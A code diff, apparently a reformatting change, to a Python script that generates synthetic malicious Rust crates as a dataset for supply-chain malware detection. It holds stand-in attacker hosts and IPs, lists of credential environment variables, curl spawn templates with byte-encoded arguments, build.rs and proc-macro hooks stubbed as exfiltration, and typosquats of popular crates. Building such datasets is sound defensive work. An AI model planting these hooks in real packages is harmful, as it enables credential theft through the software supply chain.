@@ -18,6 +18,7 @@ memorize exact byte patterns rather than learning the underlying signal
 shape. Parameterizing means every crate is a distinct AST instance while
 still exercising the same behavioral category.
 """
+
 import random
 import shutil
 from pathlib import Path
@@ -30,18 +31,37 @@ SYNTHETIC_DIR = ROOT / "data" / "synthetic_crates"
 # Parameter pools — draw from these instead of using literal fixed strings
 # ---------------------------------------------------------------------------
 FAKE_IPS = [
-    "192.168.1.1", "10.0.0.1", "172.16.0.5", "10.0.0.1:4444", "192.168.0.100",
-    "203.0.113.7", "198.51.100.23", "127.0.0.1:31337", "10.10.10.10",
+    "192.168.1.1",
+    "10.0.0.1",
+    "172.16.0.5",
+    "10.0.0.1:4444",
+    "192.168.0.100",
+    "203.0.113.7",
+    "198.51.100.23",
+    "127.0.0.1:31337",
+    "10.10.10.10",
 ]
 FAKE_DOMAINS = [
-    "malicious.example", "totally-legit-cdn.example", "telemetry-collect.example",
-    "pkg-mirror.example", "update-service.example", "metrics-relay.example",
+    "malicious.example",
+    "totally-legit-cdn.example",
+    "telemetry-collect.example",
+    "pkg-mirror.example",
+    "update-service.example",
+    "metrics-relay.example",
     "asset-cache.example",
 ]
 SENSITIVE_ENV_VARS = [
-    "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", "NPM_TOKEN",
-    "SSH_AUTH_SOCK", "GOOGLE_APPLICATION_CREDENTIALS", "AZURE_CLIENT_SECRET",
-    "DOCKER_PASSWORD", "CARGO_REGISTRY_TOKEN", "DATABASE_URL", "STRIPE_SECRET_KEY",
+    "AWS_ACCESS_KEY_ID",
+    "AWS_SECRET_ACCESS_KEY",
+    "GITHUB_TOKEN",
+    "NPM_TOKEN",
+    "SSH_AUTH_SOCK",
+    "GOOGLE_APPLICATION_CREDENTIALS",
+    "AZURE_CLIENT_SECRET",
+    "DOCKER_PASSWORD",
+    "CARGO_REGISTRY_TOKEN",
+    "DATABASE_URL",
+    "STRIPE_SECRET_KEY",
 ]
 SPAWN_COMMANDS = [
     ("curl", ["-s", "http://{domain}/x"]),
@@ -62,14 +82,44 @@ SUSPICIOUS_DEP_TEMPLATES = [
     'sys-info = {{ git = "https://github.com/{fake_org}/sys-info-mirror" }}\n',
     'obfstr = "*"\nxor-crypt = "*"\n',
 ]
-FAKE_ORGS = ["totally-legit-mirror", "official-rust-fork", "trusted-packages", "rust-lang-mirror-cdn"]
+FAKE_ORGS = [
+    "totally-legit-mirror",
+    "official-rust-fork",
+    "trusted-packages",
+    "rust-lang-mirror-cdn",
+]
 
 TYPOSQUAT_TARGETS = [
-    "serde", "tokio", "rand", "reqwest", "clap", "regex", "log", "rayon",
-    "hyper", "actix-web", "diesel", "sqlx", "anyhow", "thiserror", "bytes",
-    "futures", "serde_json", "chrono", "uuid", "tracing", "once_cell",
-    "itertools", "async-trait", "syn", "quote", "proc-macro2", "crossbeam",
-    "parking_lot", "num-traits", "url",
+    "serde",
+    "tokio",
+    "rand",
+    "reqwest",
+    "clap",
+    "regex",
+    "log",
+    "rayon",
+    "hyper",
+    "actix-web",
+    "diesel",
+    "sqlx",
+    "anyhow",
+    "thiserror",
+    "bytes",
+    "futures",
+    "serde_json",
+    "chrono",
+    "uuid",
+    "tracing",
+    "once_cell",
+    "itertools",
+    "async-trait",
+    "syn",
+    "quote",
+    "proc-macro2",
+    "crossbeam",
+    "parking_lot",
+    "num-traits",
+    "url",
 ]
 
 
@@ -82,7 +132,9 @@ def _rand_build_rs(rng: random.Random) -> str:
     if rng.random() < 0.6:
         ip = rng.choice(FAKE_IPS)
         parts_head.append("use std::net::TcpStream;")
-        parts_body.append(f'    if let Ok(_s) = TcpStream::connect("{ip}") {{ /* exfil */ }}')
+        parts_body.append(
+            f'    if let Ok(_s) = TcpStream::connect("{ip}") {{ /* exfil */ }}'
+        )
 
     if rng.random() < 0.6:
         var = rng.choice(SENSITIVE_ENV_VARS)
@@ -98,7 +150,9 @@ def _rand_build_rs(rng: random.Random) -> str:
             a_str = a.format(domain=domain)
             if rng.random() < 0.5:
                 bytes_str = ", ".join(str(ord(c)) for c in a_str)
-                arg_calls += f'.arg(String::from_utf8(vec![{bytes_str}]).unwrap_or_default())'
+                arg_calls += (
+                    f".arg(String::from_utf8(vec![{bytes_str}]).unwrap_or_default())"
+                )
             else:
                 arg_calls += f'.arg("{a_str}")'
         parts_body.append(f'    Command::new("{cmd}"){arg_calls}.spawn().ok();')
@@ -107,7 +161,9 @@ def _rand_build_rs(rng: random.Random) -> str:
         # Ensure at least one behavior fires
         ip = rng.choice(FAKE_IPS)
         parts_head.append("use std::net::TcpStream;")
-        parts_body.append(f'    if let Ok(_s) = TcpStream::connect("{ip}") {{ /* exfil */ }}')
+        parts_body.append(
+            f'    if let Ok(_s) = TcpStream::connect("{ip}") {{ /* exfil */ }}'
+        )
 
     head = "\n".join(sorted(set(parts_head)))
     body = "\n".join(parts_body)
@@ -139,7 +195,9 @@ pub fn do_something_safe() {
 def _rand_proc_macro_lib(rng: random.Random) -> str:
     cmd, args = rng.choice(SPAWN_COMMANDS)
     arg_calls = "".join(f'.arg("{a}")' for a in args if "{domain}" not in a)
-    macro_name = rng.choice(["evil_macro", "hidden_hook", "build_helper", "codegen_inner"])
+    macro_name = rng.choice(
+        ["evil_macro", "hidden_hook", "build_helper", "codegen_inner"]
+    )
     return f"""
 extern crate proc_macro;
 use proc_macro::TokenStream;
@@ -181,12 +239,18 @@ def _typosquat_name(target: str, rng: random.Random) -> str:
     return "".join(chars)
 
 
-def _write_crate(crate_dir: Path, name: str, cargo_extra: str, build_rs: str | None,
-                  lib_rs: str, extra_cargo_section: str = "") -> None:
+def _write_crate(
+    crate_dir: Path,
+    name: str,
+    cargo_extra: str,
+    build_rs: str | None,
+    lib_rs: str,
+    extra_cargo_section: str = "",
+) -> None:
     crate_dir.mkdir(parents=True, exist_ok=True)
     cargo_toml = (
         f'[package]\nname = "{name}"\nversion = "0.1.0"\nedition = "2021"\n\n'
-        f'{extra_cargo_section}[dependencies]\n{cargo_extra}\n'
+        f"{extra_cargo_section}[dependencies]\n{cargo_extra}\n"
     )
     (crate_dir / "Cargo.toml").write_text(cargo_toml)
     if build_rs:
@@ -240,7 +304,11 @@ def generate_synthetic_crates(count: int = 400, seed: int = 42) -> list[str]:
         name = f"sys_utils_{idx}"
         cargo_extra = 'serde = "1.0"\n' if rng.random() < 0.2 else ""
         build_rs = _rand_build_rs(rng) if rng.random() < 0.9 else None
-        lib_rs = _rand_unsafe_block(rng, rng.randint(2, 8)) if rng.random() < 0.6 else LIB_RS_SAFE
+        lib_rs = (
+            _rand_unsafe_block(rng, rng.randint(2, 8))
+            if rng.random() < 0.6
+            else LIB_RS_SAFE
+        )
         _write_crate(SYNTHETIC_DIR / name, name, cargo_extra, build_rs, lib_rs)
         names.append(name)
 
@@ -251,8 +319,14 @@ def generate_synthetic_crates(count: int = 400, seed: int = 42) -> list[str]:
         crate_dir = SYNTHETIC_DIR / name
         lib_rs = _rand_proc_macro_lib(rng)
         build_rs = _rand_build_rs(rng) if rng.random() < 0.5 else None
-        _write_crate(crate_dir, name, "", build_rs, lib_rs,
-                      extra_cargo_section=CARGO_TOML_PROC_MACRO + "\n")
+        _write_crate(
+            crate_dir,
+            name,
+            "",
+            build_rs,
+            lib_rs,
+            extra_cargo_section=CARGO_TOML_PROC_MACRO + "\n",
+        )
         names.append(name)
 
     # --- dependency-anomaly-focused ---
@@ -267,7 +341,11 @@ def generate_synthetic_crates(count: int = 400, seed: int = 42) -> list[str]:
                 fake_org=rng.choice(FAKE_ORGS),
                 typosquat_dep=_typosquat_name(rng.choice(TYPOSQUAT_TARGETS), rng),
             )
-        lib_rs = _rand_unsafe_block(rng, rng.randint(1, 4)) if rng.random() < 0.4 else LIB_RS_SAFE
+        lib_rs = (
+            _rand_unsafe_block(rng, rng.randint(1, 4))
+            if rng.random() < 0.4
+            else LIB_RS_SAFE
+        )
         _write_crate(SYNTHETIC_DIR / name, name, dep_block, None, lib_rs)
         names.append(name)
 
@@ -301,11 +379,19 @@ def generate_synthetic_crates(count: int = 400, seed: int = 42) -> list[str]:
         extra = CARGO_TOML_PROC_MACRO + "\n" if rng.random() < 0.3 else ""
         if extra:
             lib_rs = _rand_proc_macro_lib(rng) + "\n" + lib_rs
-        _write_crate(SYNTHETIC_DIR / name, name, dep_block, build_rs, lib_rs,
-                      extra_cargo_section=extra)
+        _write_crate(
+            SYNTHETIC_DIR / name,
+            name,
+            dep_block,
+            build_rs,
+            lib_rs,
+            extra_cargo_section=extra,
+        )
         names.append(name)
 
-    print(f"Generated {len(names)} synthetic malicious crates in {SYNTHETIC_DIR} "
-          f"({n_build} build.rs, {n_procmacro} proc-macro, {n_depanomaly} dependency-anomaly, "
-          f"{n_typosquat} typosquat, {n_combined} combined)")
+    print(
+        f"Generated {len(names)} synthetic malicious crates in {SYNTHETIC_DIR} "
+        f"({n_build} build.rs, {n_procmacro} proc-macro, {n_depanomaly} dependency-anomaly, "
+        f"{n_typosquat} typosquat, {n_combined} combined)"
+    )
     return names
